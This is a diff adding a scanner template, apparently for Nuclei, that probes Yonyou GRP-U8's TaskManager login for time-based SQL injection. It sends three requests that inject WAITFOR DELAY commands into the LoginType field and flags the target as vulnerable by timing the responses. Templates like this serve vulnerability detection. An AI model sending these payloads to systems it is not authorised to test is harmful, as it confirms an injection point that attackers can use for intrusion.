@@ -1,0 +1,60 @@
+id: yonyou-GRP-U8-LoginType-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: info
+  description: description
+  reference:
+    - https://github.com/wy876/POC/commit/a9e4000fc76d0157b53ade916323b7b8256b17c3#diff-9c71087120c2d301500fbbbfaca2ab7f0cabb660633fb9a263de903d390cc849R8
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /TaskManager/taskmanager_login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Cookie: JSESSIONID=6D291F1355C003C0237B76758924D087
+        Cache-Control: max-age=0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 114
+
+        UserNameText=%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1&UserPassText=abc&LoginType=;WAITFOR DELAY '0:0:3'--&submitAction=login
+      - |-
+        POST /TaskManager/taskmanager_login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Cookie: JSESSIONID=6D291F1355C003C0237B76758924D087
+        Cache-Control: max-age=0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 114
+
+        UserNameText=%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1&UserPassText=abc&LoginType=;WAITFOR DELAY '0:0:6'--&submitAction=login
+      - |-
+        POST /TaskManager/taskmanager_login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Cookie: JSESSIONID=6D291F1355C003C0237B76758924D087
+        Cache-Control: max-age=0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 114
+
+        UserNameText=%CF%B5%CD%B3%B9%DC%C0%ED%D4%B1&UserPassText=abc&LoginType=;WAITFOR DELAY '0:0:9'--&submitAction=login
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
